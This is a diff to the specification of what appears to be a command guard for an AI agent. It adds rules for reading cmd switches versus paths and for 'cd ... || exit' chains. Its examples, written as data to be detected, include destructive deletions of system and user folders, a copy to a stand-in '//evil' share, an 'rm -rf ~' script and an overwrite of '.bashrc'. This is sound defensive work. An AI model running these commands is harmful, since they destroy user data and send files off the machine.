@@ -540,8 +540,10 @@ or a function body, which runs again from where the last pass left the line
 `f() { cd .. > x; }; f; f`; in PowerShell `foreach`, `ForEach-Object`, `while`,
 `for` and `function`), and when an earlier `cd` may not have moved the line: it
 ran in a pipeline stage or in the background, on the right of `&&` or `||`, in
-a branch of an `if`, `case` or `switch` or a `try`, on the left of `||`, or
-through a wrapper that runs it as a program or in a shell of its own, such as
+a branch of an `if`, `case` or `switch` or a `try`, on the left of `||` (not
+one whose right side ends the shell, `cd s || exit`: see "A script a line
+writes and then runs" below), or through a wrapper that runs it as a program
+or in a shell of its own, such as
 `env`, `nohup`, `timeout`, `coproc` or cmd's `start` (`cd sub || cd .. > ../x`,
 `if false; then cd sub; fi; cd .. > ../x`, `env cd sub; cd .. > ../x`; the same
 in PowerShell and cmd). Only a `cd` after one of those is read this way: a
@@ -1499,6 +1501,31 @@ a path.
 - In PowerShell and cmd a name is read the way Windows reads it: `.git.`, `.git `
   and `GIT~1` are the repository's history, and `x.txt:stream` is known only
   when it runs (see [Core](core.md#what-core-judges)).
+- **A cmd argument that starts with `/` is a switch only by its shape**: a
+  switch name (letters, digits, `-`, `+` and `?`: `/q`, `/-y`, `/?`, `/mir`),
+  or a run of names of at most three characters each (`/s/q`), each with an
+  optional `:value` (`/a:-d`, `/R:3`, `/a:h/s/q`). Anything else is a path,
+  judged where it lands, which can only be stricter than a switch: a text that
+  starts with two separators (`//evil/share/x`, `//?/C:/Windows`, `/\evil\s`)
+  is a share or a long path, as its backslash spelling is, so `del
+  //evil/share/x` and `del /s /q //?/C:/Windows` are `delete` and `copy x
+  //evil/s` is `overwrite`; one core reads as a device (`/dev/sda`) is that
+  device; one with a `\` or a `.`, a run with a longer part
+  (`/evil/share/x`), or a value that holds a separator or starts with a drive
+  (`del /a:C:/Windows`) is a path. A built-in command splits an argument at
+  `,`, `;` and `=` first, and each part is a switch or a path of its own
+  (`del /q;//evil/s`). cmd's built-ins (`del`, `rd`, `copy`, `move`, `ren`,
+  `md`, `mklink`) and `xcopy` take only their own switch names, every name of
+  a run among them: cmd never reads a quoted word as a switch and the guard
+  no longer sees the quotes, so `rd /s /q "/Users"` deletes the folder
+  `\Users` and is `delete`, as is `rd /s /q /Users`. A switch whose value
+  names a file has the value judged: `xcopy /exclude:` reads a list of
+  strings to skip and is no operand;
+  `robocopy`'s `/LOG:`, `/LOG+:`, `/UNILOG:` and `/UNILOG+:` write a log and
+  `/SAVE:` a job file (the name and `.rcj`), each judged as a write
+  (`robocopy a b /LOG:C:\Users\me\.bashrc` is `overwrite`, and so is
+  `/LOG:%X%`, a write to a place known only when it runs); `/JOB:` copies
+  by a job file the guard never reads, so it is `unknown`.
 
 Inside a workspace or a temporary directory is the agent's own. Not the agent's
 own: the home directory, a system folder, the root of a disk, the workspace
@@ -2212,6 +2239,38 @@ Some risks only show when units are read together.
   its name, as above: a run of a script of that name is `unknown`, and one of
   another name (`echo x > log; cd a; cd b; cd c; cd d; cd e; cd f; ./app`)
   stays safe.
+  An `||` whose right side ends the shell is the exception: in `cd s ||
+  exit` the rest of the line runs only when the left side did not fail, so
+  the `cd` ran, and so did every `cd` on the right of an `&&` before the
+  `||` (`cd a && cd b || exit`). After the list the line is only where the
+  left side took it, for a run of a file and for every other check (where
+  paths are placed, where a redirect opens): `echo x > x.sh; cd s || exit;
+  bash x.sh` and `cd a || exit; make > log; cd ../b || exit; make > log; cd
+  ../c || exit; make > log; cd ../d || exit; ./build.sh` stay safe, while
+  `echo x > x.sh; cd s || exit; bash ../x.sh` is `unknown`. The right side
+  itself still runs where the failed `cd` left the line (`echo x > x.sh; cd
+  s || { bash x.sh; exit; }` is `unknown`). A right side ends the shell when
+  it is the builtin `exit`, alone or last in a `{ …; }` group (in cmd,
+  `exit`, `exit /b`, alone or last in a `( … )` block, which runs in cmd
+  itself). Nothing else does: `true`; `return`, which bash goes on past
+  outside a function (inside one, its `cd` is already one that may not have
+  run); an `exit` with a redirect of its own, before or after its name
+  (`<nofile exit`, `exit <<< x`, `exit 2> /dev/null`: the grammar puts the
+  last on the whole list), which does not run when the redirect fails; one
+  with more than one argument, or one that may expand to more (`exit 1 2`,
+  `exit *`, `exit "$@"`), which zsh goes on past; one in a subshell, a
+  pipeline or the background, which ends only that process; one after the
+  line defines a function of that name, or uses `alias`, `enable` or
+  `disable`; cmd's `exit /?`, or any argument with `/?` in it (`exit /b/?`),
+  which prints its help; and PowerShell's `exit`, which its grammar reads
+  after `||` as a command. Nor is a left side that may succeed when its `cd`
+  failed taken as one whose `cd` ran: one with a `!` anywhere in it (`! cd s
+  || exit`, `{ ! cd s; } || exit`, `cd a && ! cd b || exit`), and any left
+  side once the line defines a function named `cd`, `chdir`, `pushd` or
+  `popd` (`cd() { :; }; cd s || exit`), which may return 0 without moving
+  the line. An `||` before it in the same list still counts (`true || cd s
+  || exit; bash x.sh` runs where the line began when `true` succeeds), and so
+  does a left side that ends in `|| true`.
   The file may be run as the program itself, not only handed to a shell: a
   program named by a path (`./x.sh`, `x/run`, `/tmp/x`, `~/x.sh`) is that
   file, so `echo 'rm -rf ~' > x.sh; ./x.sh` and `curl -o run URL; chmod +x
